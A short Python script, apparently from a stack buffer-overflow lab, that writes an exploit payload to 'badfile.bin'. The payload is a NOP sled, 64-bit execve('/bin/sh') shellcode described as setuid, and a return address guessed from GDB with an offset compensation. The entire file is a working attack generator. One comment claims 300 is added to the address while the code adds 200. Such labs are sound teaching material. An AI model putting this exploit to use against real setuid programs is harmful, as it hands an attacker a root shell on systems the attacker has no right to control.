#! /usr/bin/env python3

import sys

# Replace the content with the actual shellcode
# 64-bit execve('/bin/sh') setuid shellcode
SHELLCODE = (
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

PAYLOAD_LEN = 120  # 112 Offset to rbp + 8 bytes
SHELLCODE_LEN = len(SHELLCODE)
ADD_LEN = 8  # Length of the address 4 for 32-bit and 8 for 64-bit
NOP_LEN = PAYLOAD_LEN - SHELLCODE_LEN

# FIXME if needed
GDB_SHIFT_COMPENSATION = 200 # stack is shigted higher in GDB due to its own environment variables, args, etc.
RET_ADD = 0x7fffffffc850 + GDB_SHIFT_COMPENSATION  # FIXME: Change this address

# Remove the 00 from the address
# Note, 300 is added because the address shown in the gdb is different from
# the actual address shown in the stack when the program is running.
# This is because gdb pushes some values to the stack before running the program.
# You can try different values to get the correct address if the attack is not successful.
# Also, leading 00s not printed in gdb, but are automatically added by
#  .to_bytes(ADD_LEN, byteorder='little') to make it 8 bytes long.

#####################################################################
# Build the payload
# The content of the badfile is as follows:
NOP_SLED = b'\x90'*NOP_LEN
repeated_add = (RET_ADD).to_bytes(ADD_LEN, byteorder='little')
payload = NOP_SLED + SHELLCODE + repeated_add

# Write the payload to a binary file
with open('badfile.bin', 'wb') as f:
    f.write(payload)

#####################################################################
